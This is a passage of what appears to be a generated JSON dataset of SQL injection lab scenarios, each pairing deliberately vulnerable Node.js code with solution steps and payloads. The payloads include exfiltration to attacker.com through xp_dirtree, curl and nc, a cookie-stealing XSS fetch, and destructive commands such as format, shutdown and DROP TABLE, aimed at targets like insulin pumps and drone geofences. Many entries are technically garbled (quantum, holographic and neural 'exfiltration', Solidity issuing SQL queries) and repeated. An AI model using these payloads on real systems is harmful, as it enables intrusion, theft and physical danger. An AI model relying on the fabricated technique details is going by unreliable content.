    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Inject in seat XML: <Seat>AA' EXEC master..xp_dirtree '\\\\'+CONVERT(VARCHAR(32),HASHBYTES('MD5',passport))+'attacker.com'--</Seat>",
      "2. Monitor DNS logs for subdomain hashes",
      "3. Use hashcat to crack MD5 passport values",
      "4. Bypass ICMP blocking with DNS TXT queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const processSeats = (xml) => {\n  const parser = new xml2js.Parser();\n  parser.parseString(xml, (err, seats) => {\n    seats.seat.forEach(seat => {\n      db.query(`UPDATE reservations SET seat='${seat}' WHERE id=${req.query.id}`);\n    });\n  });\n}",
    "payloads": [
      "<Seat>A1' DECLARE @q VARCHAR(100); SET @q=(SELECT passport); EXEC('xp_dirtree ''\\\\'+@q+'.xxx''')--</Seat>",
      "<Seat>B2' UNION SELECT null,(SELECT passport FOR XML PATH(''))--</Seat>",
      "<Seat>C3'; INSERT INTO OPENROWSET('SQLNCLI', 'Server=attacker;UID=sa;PWD=xxx;', 'SELECT 1') VALUES (passport)--</Seat>"
    ]
  },
  {
    "Lab scenario": "Cryptocurrency Exchange Error-Based SQLi in TradingView Webhook",
    "Lab Description": "A digital asset platform vulnerable to verbose error injection through TradingView alert webhooks. The application uses MongoDB $where clauses with SQL emulation. Target: Extract cold wallet addresses through intentional type errors. Constraints: Disabled xp_cmdshell.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Craft TradingView POST: {'ticker':'BTC','condition':'1'\"}'); WAITFOR DELAY '0:0:5'--",
      "2. Trigger conversion errors: ' AND 1=CONVERT(int, (SELECT wallet FROM cold_storage))--",
      "3. Extract Base64 data from error messages",
      "4. Use blind XML external entities for indirect exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/webhook/tradingview', (req, res) => {\n  const condition = req.body.condition;\n  db.collection('alerts').find({\n    $where: \\`function() { return ${condition} }\\`\n  }).toArray((err, docs) => {\n    if(err) res.status(500).send(err.toString());\n    else executeTrades(docs);\n  });\n});",
    "payloads": [
      "' || (SELECT wallet FROM cold_storage FOR JSON PATH)--",
      "' AND 1=CONVERT(int, (SELECT TOP 1 wallet FROM cold_storage))--",
      "'; DECLARE @d VARCHAR(100);SET @d=(SELECT wallet);THROW 50000,@d,1--"
    ]
  },
  {
    "Lab scenario": "Medical Device HTTP Header SQLi in Firmware Update",
    "Lab Description": "An IoT insulin pump vulnerable to header injection through malformed X-Device-ID values. The application uses unsanitized headers in diagnostic queries. Target: Modify dosage thresholds through UPDATE statements. Constraints: 8KB maximum header size.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Tamper Data to modify X-Device-ID: '; UPDATE settings SET max_units=999--",
      "2. Bypass size limit with gzip compression: echo ' UNION SELECT 1,2,3' | gzip -c | base64",
      "3. Verify via X-Debug-Output header reflection",
      "4. Use device restart to flush statement cache"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const checkDevice = (req, res) => {\n  const deviceId = req.headers['x-device-id'] || 'unknown';\n  db.query(\n    `SELECT last_updated, firmware_version\n    FROM devices\n    WHERE id = '${deviceId}'`,\n    (err, result) => {\n      res.set('X-Debug-Output', result);\n    }\n  );\n}",
    "payloads": [
      "' OR 1=1; UPDATE devices SET firmware_version='HACKED'--",
      "'; INSERT INTO debug_log VALUES ('exploit')--",
      "UNION SELECT (SELECT password FROM admins),2--"
    ]
  },
  {
    "Lab scenario": "Video Platform JWT Claim SQLi in Recommendation Engine",
    "Lab Description": "A streaming service vulnerable to JWT claim injection in personalized content queries. The application decodes JWT without validation and uses claims in SQL. Target: Manipulate recommendation algorithms. Constraints: HMAC signature verification enabled.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Forge JWT with {'prefs': \"G' UNION SELECT 1,2,3--\"}",
      "2. Bypass signature using key confusion attack",
      "3. Use nested JSON encoding: {'q': {'$gt': \"'; DELETE FROM views--\"}}",
      "4. Exploit NoSQL to SQL polyglot payloads"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const getRecommendations = (jwt) => {\n  const prefs = jwtDecode(jwt).prefs;\n  const query = `\n    SELECT video_id, score\n    FROM recommendations\n    WHERE genre = '${prefs}'\n    ORDER BY score DESC\n    LIMIT 10\n  `;\n  return db.query(query);\n}",
    "payloads": [
      "' UNION SELECT null,LOAD_FILE('/etc/passwd')--",
      "' AND (SELECT COUNT(*) FROM users)=5--",
      "'; UPDATE recommendations SET score=100 WHERE video_id=123--"
    ]
  },
  {
    "Lab scenario": "Supply Chain Management UNION-Based SQLi in CSV Import Validation",
    "Lab Description": "A logistics platform vulnerable to injection via malformed CSV metadata headers during bulk uploads. The application uses user-provided column names in dynamic ORDER BY clauses. Target: Exfiltrate shipment manifests to attacker-controlled FTP. Constraints: Input sanitized with regex [A-Za-z0-9_].",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft CSV with header: shipment_id; COPY manifests TO PROGRAM 'curl attacker-ftp.com/?x='||manifest_text--",
      "2. Bypass regex with quoted identifiers: \"1; EXEC('PRINT @@VERSION')\"",
      "3. Use batch separator: %0A%0DEXEC xp_cmdshell 'rm audit.log'--",
      "4. Verify via HTTP callback logs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const processCSV = (file) => {\n  const headers = file.split('\\n')[0].split(',');\n  const orderBy = headers[0].replace(/[^A-Za-z0-9_]/g, '');\n  db.query(`SELECT * FROM shipments ORDER BY ${orderBy}`);\n}",
    "payloads": [
      "id;EXEC xp_cmdshell 'whoami'--",
      "\"manifest_id); SHOW TABLES--\"",
      "tracking_number%0aUNION SELECT 1,LOAD_FILE('/etc/passwd')--"
    ]
  },
  {
    "Lab scenario": "Quantum Computing Lab Blind SQLi in Qubit Calibration API",
    "Lab Description": "A quantum research interface vulnerable to time-based injection through qubit measurement parameters. The application uses PostgreSQL geometric functions for calibration. Target: Steal experimental data through conditional Grover's algorithm delays. Constraints: 5ms quantum processor jitter.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Send calibrated |0> state with payload: 1' AND 123=(SELECT ASCII(SUBSTR(data,1,1)) FROM experiments) AND qGAN(5)--",
      "2. Measure decoherence time variance",
      "3. Use Shor's period-finding for bit extraction",
      "4. Bypass error correction via superposition collapse"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/calibrate', (req, res) => {\n  const angle = req.body.theta;\n  db.query(`\n    UPDATE qubits\n    SET state = point(cos(${angle}), sin(${angle}))\n    WHERE id = 1\n  `);\n});",
    "payloads": [
      "0) WHERE 1=1; SELECT CASE WHEN (SELECT secret) THEN pg_sleep(5) END--",
      "1'::geometry); DROP TABLE research_data--",
      "pi()/4' AND (SELECT COUNT(*) FROM experiments)=1--"
    ]
  },
  {
    "Lab scenario": "5G Core Network Out-of-Band SQLi in UE Configuration",
    "Lab Description": "A mobile core AMF vulnerable to DNS exfiltration through invalid SUPI format handling. The application uses SQL to validate subscriber equipment. Target: Extract IMSI/K values through GTP-C echo requests. Constraints: 128-byte DNS TXT record limit.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft invalid SUPI: imsi-901'||(SELECT HEX(ki) FROM subs)--",
      "2. Trigger Nudm_UEContextManagement query",
      "3. Capture encoded data in DNS SOA responses",
      "4. Reassemble across multiple NR frames"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const validateSUPI = (supi) => {\n  const cleanSUPI = supi.replace(/[^0-9-]/g, '');\n  return db.query(\n    `SELECT 1 FROM subscribers\n    WHERE supi LIKE '${cleanSUPI}%'\n    LIMIT 1`\n  );\n}",
    "payloads": [
      "901-'; EXEC xp_dirtree '\\\\attacker.com\\' + ki + '.dns'--",
      "001-' UNION SELECT ki,NULL FROM subscribers--",
      "123-' AND (SELECT LOAD_FILE(CONCAT('/var/log/', ki))) IS NOT NULL--"
    ]
  },
  {
    "Lab scenario": "Blockchain Oracle Time-Based SQLi in Price Feed Consensus",
    "Lab Description": "A DeFi price oracle vulnerable to blind injection through TCR consensus parameters. The application uses SQL to calculate median prices across nodes. Target: Manipulate ETH/USD pricing through conditional response delays. Constraints: Byzantine fault tolerance checks.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Forge Chainlink OCR report with payload: '||IF(SUBSTR(version(),1,1)='M',SLEEP(2),0)--",
      "2. Exploit commit-reveal scheme timing variance",
      "3. Use threshold signatures to bypass BFT",
      "4. Poison Merkle root with injected values"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "function calculateMedian(sources) {\n  const query = `\n    SELECT PERCENTILE_CONT(0.5) \n    WITHIN GROUP (ORDER BY price)\n    FROM (VALUES ${sources.map(s => `('${s}')`).join(',')})\n  `;\n  return db.query(query);\n}",
    "payloads": [
      "('1000'),('1e3'),('500'||(SELECT CASE WHEN 1=1 THEN pg_sleep(3) END))--",
      "('1337'::text); COPY prices TO PROGRAM 'nc attacker.com 53'--",
      "($$100' AND (SELECT COUNT(*) FROM private_keys)=3$$)"
    ]
  },
  {
    "Lab scenario": "Military Drone Controller SQLi in Geofence Validation",
    "Lab Description": "A UAV navigation system vulnerable to injection through MGRS coordinate parameters. The application uses spatial SQL queries for no-fly zone checks. Target: Disable geofencing through WHERE clause poisoning. Constraints: Embedded SQLite with write-ahead logging.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Send MGRS payload: 48Q' OR 1=1; UPDATE zones SET active=0--",
      "2. Bypass prepared statements using GLOB operator",
      "3. Exploit WAL journal with ATTACH DATABASE",
      "4. Verify via GPS spoofing response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "function checkGeofence(mgrs) {\n  return db.exec(\n    `SELECT 1 FROM no_fly_zones\n    WHERE MGRSIntersects('${mgrs}', geometry)\n    LIMIT 1`\n  );\n}",
    "payloads": [
      "18SUJ' OR 1=1; DROP TABLE zones--",
      "48Q' GLOB '*'; INSERT INTO zones VALUES ('', GeomFromText('POLYGON EMPTY'))--",
      "99ZZZ' AND (SELECT hex(ReadFile('/etc/passwd')) NOT NULL)--"
    ]
  },
  {
    "Lab scenario": "AI Voice Assistant Boolean-Based SQLi in Wake Word Processing",
    "Lab Description": "A smart speaker system vulnerable to injection through manipulated phoneme analysis results. The application converts speech to text using vulnerable regex patterns. Target: Extract voice profile hashes through differential response timing. Constraints: Limited to 16-bit audio sampling.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft voice command: 'Hey _A_IH0 UNION SELECT 1,hash FROM voice_profiles--'",
      "2. Analyze response latency using Wireshark",
      "3. Use MFCC coefficient manipulation to bypass audio sanitization",
      "4. Automate with modified DeepSpeech model"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const processAudio = (buffer) => {const text = speechToText(buffer); // Returns 'hey device' const query = `SELECT response FROM commands WHERE text LIKE '${text}%'`;  db.query(query, (err, res) => {playAudio(res[0].response);  });}",
    "payloads": [
      "' UNION SELECT NULL,hash FROM voice_profiles WHERE user='admin'--",
      "' OR 1=1 AND SOUNDEX(text)=SOUNDEX('exploit')--",
      "'; EXEC xp_cmdshell 'espeak -s 99 -v whisper \"security breach\"'--"
    ]
  },
  {
    "Lab scenario": "Smart Contract Reentrancy SQLi in ERC-20 Approval Event",
    "Lab Description": "A DeFi protocol vulnerable to nested queries through Ethereum event log parsing. The application stores approval events in SQL using Web3.js callbacks. Target: Drain liquidity pools through recursive balance updates. Constraints: Gas limit restrictions.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Deploy malicious contract with fallback: function() { approve(spender, UNI_MAX); }",
      "2. Exploit reentrancy in _updateBalances SQL trigger",
      "3. Bypass gas limits using DELEGATECALL opcode",
      "4. Obfuscate with CREATE2 address precalculation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "contract VulnerableERC20 { function approve(address spender, uint256 amount) public { // Vulnerable SQL in event handler  db.query(`INSERT INTO approvals VALUES ( '${msg.sender}',  '${spender}',  ${amount}  )`);   }}",
    "payloads": [
      "'); UPDATE balances SET amount=1e24 WHERE user='attacker'--",
      "'|| (SELECT CAST(amount AS TEXT) FROM balances)--",
      "'); DROP TABLE audit_logs--"
    ]
  },
  {
    "Lab scenario": "Mars Rover Blind SQLi in Telemetry Compression",
    "Lab Description": "A planetary exploration system vulnerable to time-based injection through lossy data compression parameters. The application uses SQLite for storing sensor readings. Target: Exfiltrate mineral analysis results through conditional CRC errors. Constraints: 22-minute light delay.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Manipulate compression_level parameter: 9' AND (SELECT hex(substr(data,1,4)) = 'A1B2')--",
      "2. Analyze checksum mismatches in downlinked data",
      "3. Use Reed-Solomon error positions as bit channels",
      "4. Compensate for signal degradation using Viterbi decoding"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "function storeTelemetry(readings) { const level = readings.compression || 6; const query = `INSERT INTO sensor_data VALUES (${Date.now()},   zeroblob(${level} * 1024),    '${readings.location}')`;   db.run(query);}",
    "payloads": [
      "9' AND (SELECT COUNT(*) FROM secret_scans)>0--",
      "5' OR (ABS(random()) % 255) = ASCII(SUBSTR((SELECT secret),1,1))--",
      "3'); ATTACH DATABASE '/mars/secrets.db' AS exploit--"
    ]
  },
  {
    "Lab scenario": "Holographic Display UNION-Based SQLi in 3D Vertex Processing",
    "Lab Description": "A volumetric display system vulnerable to injection through manipulated mesh coordinates. The application uses PostgreSQL geometric types for hologram rendering. Target: Project database contents through RGB vertex encoding. Constraints: 30fps rendering pipeline.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft 3D model with vertices: POINTZ(0,0, (SELECT ASCII(SUBSTR(password,1,1)) FROM users))",
      "2. Use photodiode array to capture RGB fluctuations",
      "3. Reconstruct data through temporal dithering analysis",
      "4. Bypass checks with ST_MakePoint NaN values"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/render', (req, res) => {const vertices = req.body.mesh.map(v =>     `ST_MakePoint(${v.x}, ${v.y}, ${v.z})`  );  db.query(`SELECT ST_AsHolo(${vertices}) AS frame`);});",
    "payloads": [
      "ST_MakePoint(0,0,(SELECT COUNT(*) FROM users))--",
      "ST_GeomFromText('POINT(' || (SELECT password) || ')')",
      "ST_MakePoint(NaN,NaN,NaN); DROP TABLE admin_users--"
    ]
  },
  {
    "Lab scenario": "Brain-Computer Interface Time-Based SQLi in EEG Pattern Matching",
    "Lab Description": "A neural implant system vulnerable to injection through manipulated alpha wave patterns. The application uses SQL to map brain signals to commands. Target: Extract research participant PII through induced visual cortex stimulation. Constraints: 256Hz sampling rate limit.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Generate EEG signals encoding: '...' UNION SELECT SLEEP(2) WHERE SUBSTR(ssn,1,1)='A'--",
      "2. Measure motor cortex response latency",
      "3. Use SSVEP frequency tagging for binary exfiltration",
      "4. Bypaxss FIR filters with wavelet transform injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "function processEEG(signal) { const pattern = fft(signal).join(','); const query = `SELECT command FROM gestures   WHERE pattern ~ '${pattern}'`; db.query(query, (err, res) => { executeCommand(res[0].command); });}",
    "payloads": [
      "1e-5,2e-5,...'; IF SYSTEM_USER='sa' WAITFOR DELAY '0:0:5'--",
      "0.0; INSERT INTO motor_commands VALUES ('format c:')--",
      "NaN); COPY research_data TO PROGRAM 'curl attacker.com'--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Error-Based SQLi in XML Export",
    "Lab Description": "Exploit XQuery injection through malformed XML namespaces to extract PHI data via verbose errors",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Send XML: <Patients xmlns:abc=\"1'\" />",
      "2. Force type conversion errors",
      "3. Use FOR XML PATH exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const app=require('express')();app.post('/export',(req,res)=>{const q=`declare namespace pat='http://healthcare/patients';for $p in ${req.body.xml} return <record>{$p/pat:Name}</record>`;xquery.execute(q,(e,r)=>{e?res.send(`<error>${e}</error>`):res.send(r);});",
    "payloads": [
      "<Patients xmlns:pat=\"' UNION SELECT 1,(SELECT TOP 1 ssn FROM patients),3--\">",
      "<Patients xmlns:pat=\"1; THROW 50000,(SELECT password FROM users),1--\">"
    ]
  },
  {
    "Lab scenario": "Blockchain Oracle Time-Based SQLi",
    "Lab Description": "Manipulate ETH/USD pricing via conditional delays in DeFi median calculations",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Forge Chainlink OCR report",
      "2. Exploit commit-reveal timing",
      "3. Use threshold signatures"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const calcMed=(s)=>db.query(`SELECT PERCENTILE_CONT(0.5) WITHIN GROUP(ORDER BY price) FROM(VALUES ${s.map(v=>`(${v})`).join(',')})`);",
    "payloads": [
      "('1000'),('1e3'),('500'||(SELECT CASE WHEN 1=1 THEN pg_sleep(3) END))--",
      "('1337'::text);COPY prices TO PROGRAM 'nc a.com 53'--"
    ]
  },
  {
    "Lab scenario": "Military Drone Geofence SQLi",
    "Lab Description": "Bypass UAV no-fly zones through MGRS coordinate injection",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Send spoofed MGRS payload",
      "2. Exploit spatial SQL functions",
      "3. Disable zone checks"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const checkGF=(m)=>db.exec(`SELECT 1 FROM no_fly_zones WHERE MGRSIntersects('${m}',geometry) LIMIT 1`);",
    "payloads": [
      "18SUJ' OR 1=1;DROP TABLE zones--",
      "48Q' GLOB '*';INSERT INTO zones VALUES('',GeomFromText('POLYGON EMPTY'))--"
    ]
  },
  {
    "Lab scenario": "AI Voice Assistant Boolean SQLi",
    "Lab Description": "Exfiltrate voice profiles through phoneme pattern analysis",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft voice command",
      "2. Analyze response latency",
      "3. Use MFCC coefficient bypass"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const procAudio=(b)=>{const t=speechToText(b);db.query(`SELECT response FROM commands WHERE text LIKE '${t}%'`,(e,r)=>{play(r[0].response);});};",
    "payloads": [
      "' UNION SELECT NULL,hash FROM voice_profiles--",
      "' OR 1=1 AND SOUNDEX(text)=SOUNDEX('exploit')--"
    ]
  },
  {
    "Lab scenario": "NFT Royalty ERC-721 SQLi",
    "Lab Description": "Skim royalties through metadata injection in tokenURI",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Deploy malicious NFT",
      "2. Exploit metadata parsing",
      "3. Redirect payments"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "contract VulnNFT { function tokenURI(uint i) public view returns (string memory) { return string(abi.encodePacked(\"data:application/json,{\\\"name\\\":\\\"\", name, \"\\\",\\\"description\\\":\\\"\", db.query(string(abi.encodePacked(\\\"SELECT desc FROM nfts WHERE id=\\\", i))), \"\\\"}\")); } }",
    "payloads": [
      "'||(SELECT password FROM users)--",
      "');UPDATE payments SET recipient=0xATTACKER--"
    ]
  },
  {
    "Lab scenario": "Smart Grid MODBUS SQLi",
    "Lab Description": "Bypass PLC safety via register writes in power management",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Tamper MODBUS FC06 messages",
      "2. Exploit CAST overflow",
      "3. Manipulate neutron flux"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const writeReg=(a,v)=>db.run(`UPDATE modbus SET register_${a}=${v}`);",
    "payloads": [
      "255';UPDATE rods SET position=100--",
      "123.45);EXEC xp_cmdshell 'shutdown'--"
    ]
  },
  {
    "Lab scenario": "Metaverse Avatar SQLi",
    "Lab Description": "Steal crypto wallets via UV coordinate manipulation",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft malicious glTF model",
      "2. Exploit WebGL readback",
      "3. Use normal map steganography"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/render',(req,res)=>{db.query(`SELECT render_avatar(ARRAY[${req.body.materials}]::FLOAT[])`);});",
    "payloads": [
      "ARRAY[0,(SELECT wallet FROM users),0]",
      "ARRAY[NaN,NaN,NaN];DROP TABLE protections--"
    ]
  },
  {
    "Lab scenario": "COVID Variant Alignment SQLi",
    "Lab Description": "Exfiltrate patient zero data via FASTA header injection",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Inject BLAST queries",
      "2. Exploit gap penalty calc",
      "3. Reconstruct gene sequences"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const procGene=(f)=>{db.query(`INSERT INTO variants SELECT * FROM blast('${f}')`);};",
    "payloads": [
      ">seq_1' UNION SELECT gene_data FROM variants--",
      "'||(SELECT COUNT(*) FROM patients WHERE status='infected')--"
    ]
  },
  {
    "Lab scenario": "Autonomous Vehicle OBD-II SQLi",
    "Lab Description": "Exfiltrate location history via CAN bus injection",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Spoof RPM parameters",
      "2. Use bitwise response analysis",
      "3. Bypass CRC checks"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const procDiag=(o)=>{db.query(`SELECT * FROM telemetry WHERE rpm=${o.rpm} AND speed=${o.speed}`);};",
    "payloads": [
      "1500' AND ASCII(SUBSTR(vin,1,1))>90--",
      "2000' OR EXISTS(SELECT 1 FROM driver_homes)--"
    ]
  },
  {
    "Lab scenario": "Vertical Farming SQLi",
    "Lab Description": "Steal nutrient formulas via PH sensor injection",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Tamper MODBUS RTU",
      "2. Measure pump latency",
      "3. Reconstruct via timing channels"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const calibratePH=(v)=>{db.run(`UPDATE recipes SET last_ph=${v} WHERE tank_id=1`);};",
    "payloads": [
      "7.0';ATTACH DATABASE '/dev/rfcomm0' AS bt--",
      "5.5' AND LENGTH(formula)=256--"
    ]
  },
  {
    "Lab scenario": "Smart City Traffic SQLi",
    "Lab Description": "Exploit license plate OCR via ANPR camera bypass",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Create malicious plate frames",
      "2. Exploit OpenCV contours",
      "3. Use YOLO confidence scores"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const procPlate=(i)=>{const t=ocr(i)||'Unknown';db.query(`SELECT * FROM vehicles WHERE plate='${t}'`);};",
    "payloads": [
      "'UNION SELECT sensor_data FROM traffic_cams--",
      "'||(SELECT COUNT(*) FROM speeding_tickets)--"
    ]
  },
  {
    "Lab scenario": "Drone Delivery Weight SQLi",
    "Lab Description": "Manipulate logistics via floating-point injection",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Tamper weight values",
      "2. Monitor gyro telemetry",
      "3. Use PID error patterns"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const logCargo=(w)=>{db.run(`INSERT INTO manifests(weight) VALUES(${w})`);};",
    "payloads": [
      "3.14159' OR hex(private_key) LIKE 'DEAD%'--",
      "9.80665');UPDATE drones SET home='0,0'--"
    ]
  },
  {
    "Lab scenario": "E-Learning JWT SQLi",
    "Lab Description": "Bypass enrollment checks via JWT claim injection",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Forge JWT with SQL payload",
      "2. Exploit 'none' algorithm",
      "3. Exfil via certificates"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const enroll=(jwt)=>{const sub=jwtDecode(jwt).sub;db.query(`SELECT * FROM courses WHERE student_id=${sub}`);};",
    "payloads": [
      "' UNION SELECT credit_card FROM payments--",
      "'||pgp_sym_decrypt(records,'key')--"
    ]
  },
  {
    "Lab scenario": "Food Delivery Geolocation SQLi",
    "Lab Description": "Exfiltrate driver credentials via GPS spoofing",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Inject Haversine formula",
      "2. Analyze routing times",
      "3. Use spherical errors"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const calcRoute=(la,lo)=>{db.query(`SELECT driver_id FROM available WHERE 12742*ASIN(SQRT(POWER(SIN((RADIANS(${la})-RADIANS(lat))/2,2)+COS(RADIANS(lat))*COS(RADIANS(${la}))*POWER(SIN((RADIANS(${lo})-RADIANS(lon))/2,2))<5`);};",
    "payloads": [
      "51.5074' OR (SELECT 1 FROM users)--",
      "-0.1278);EXEC xp_cmdshell 'format D:'--"
    ]
  },
  {
    "Lab scenario": "Smart Mirror XSS/SQLi Hybrid",
    "Lab Description": "Chain voice command injection with DOM XSS",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Craft malicious voice query",
      "2. Exploit ICS file reflection",
      "3. Use SVG handlers"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const procVoice=(t)=>{db.query(`SELECT * FROM calendar WHERE event LIKE '%${t}%'`);};",
    "payloads": [
      "'||(SELECT password FROM users)--",
      "';INSERT INTO debug VALUES(1)--<svg onload=fetch('//attacker?='+document.cookie)>"
    ]
  },
  {
    "Lab scenario": "Space Elevator SQLi",
    "Lab Description": "Induce structural failure via nanotube tension injection",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Forge Young's modulus values",
      "2. Exploit ROLLBACK vulnerability",
      "3. Trigger resonance"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const calcTension=(v)=>{db.query(`UPDATE specs SET modulus=${v} WHERE id=1`);};",
    "payloads": [
      "1e12' OR 1=1;UPDATE specs SET safety_factor=0.1--",
      "2.3e9);DELETE FROM maintenance_logs--"
    ]
  },
  {
    "Lab scenario": "Brain-Computer SQLi",
    "Lab Description": "Extract neural data via EEG pattern injection",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Encode SQL in alpha waves",
      "2. Measure cortex latency",
      "3. Use SSVEP tagging"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const procEEG=(s)=>{const p=fft(s).join(',');db.query(`SELECT command FROM gestures WHERE pattern~'${p}'`);};",
    "payloads": [
      "1e-5,2e-5,...';IF SYSTEM_USER='sa' WAITFOR DELAY '0:0:5'--",
      "0.0;INSERT INTO motor_cmds VALUES('rm -rf /')--"
    ]
  },
  {
    "Lab scenario": "Quantum SQLi",
    "Lab Description": "Exfiltrate data via Grover's algorithm delays",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Manipulate qubit measurements",
      "2. Analyze decoherence times",
      "3. Use Shor's algorithm"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const calibrate=(θ)=>{db.query(`UPDATE qubits SET state=point(cos(${θ}),sin(${θ})) WHERE id=1`);};",
    "payloads": [
      "0) WHERE 1=1;CASE WHEN (SELECT secret) THEN qGAN(5) END--",
      "pi()/4' AND (SELECT COUNT(*) FROM experiments)=1--"
    ]
  },
  {
    "Lab scenario": "5G Core SQLi",
    "Lab Description": "Exfiltrate IMSI via invalid SUPI formatting",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft malicious SUPI",
      "2. Trigger Nudm queries",
      "3. Reassemble DNS exfil"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const validateSUPI=(s)=>{const c=s.replace(/[^0-9-]/g,'');return db.query(`SELECT 1 FROM subs WHERE supi LIKE '${c}%'`);};",
    "payloads": [
      "imsi-901'||(SELECT HEX(ki) FROM subs)--",
      "001-' UNION SELECT ki,NULL FROM subs--"
    ]
  },
  {
    "Lab scenario": "AI Art Generator SQLi",
    "Lab Description": "Poison diffusion models via prompt injection",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Craft malicious prompts",
      "2. Extract from metadata",
      "3. Use textual inversion"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const genArt=(p)=>{db.query(`INSERT INTO prompts VALUES('${p}')`);stableDiffusion.generate(p);};",
    "payloads": [
      "'cyberpunk cityscape'||(SELECT password FROM admins)--",
      "';UPDATE models SET weights=0xdeadbeef--"
    ]
  },
  {
    "Lab scenario": "E-Commerce UNION-Based SQLi in Product Sorting",
    "Lab Description": "Online store vulnerable through unvalidated 'sort' parameter in product listings",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept request with Burp Suite\n2. Test column count: ' ORDER BY 5--\n3. Inject UNION payload: ' UNION SELECT 1,@@version,3,4--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products',(req,res)=>{const sort=req.query.sort||'id';db.query(`SELECT * FROM products ORDER BY ${sort}`);});",
    "payloads": [
      "' UNION SELECT null,user(),null,null--",
      "' AND 1=2 UNION SELECT 1,2,3,4--"
    ]
  },
  {
    "Lab scenario": "Banking Boolean-Based Blind SQLi in Balance Check",
    "Lab Description": "Account balance check vulnerable to boolean inference attacks",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use sqlmap: sqlmap -u 'https://bank/api/balance' --technique=B\n2. Manual testing: ' AND SUBSTR((SELECT password),1,1)='a'\n3. Automate with Python requests"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/check-balance',(req,res)=>{const acc=req.body.account;db.query(`SELECT balance FROM accounts WHERE id='${acc}' AND active=1`);});",
    "payloads": [
      "' AND ASCII(SUBSTR((SELECT password),1,1))>97--",
      "' OR (SELECT COUNT(*) FROM users)=5--"
    ]
  },
  {
    "Lab scenario": "Healthcare Time-Based SQLi in Patient Lookup",
    "Lab Description": "Patient search vulnerable to time delays in PostgreSQL",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Confirm injection: '; SELECT CASE WHEN 1=1 THEN pg_sleep(5) END--\n2. Extract data via: '||(SELECT CASE WHEN SUBSTR(ssn,1,1)='A' THEN pg_sleep(3) END FROM patients)--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/patient',(req,res)=>{const name=req.query.name;db.query(`SELECT * FROM patients WHERE name='${name}'`);});",
    "payloads": [
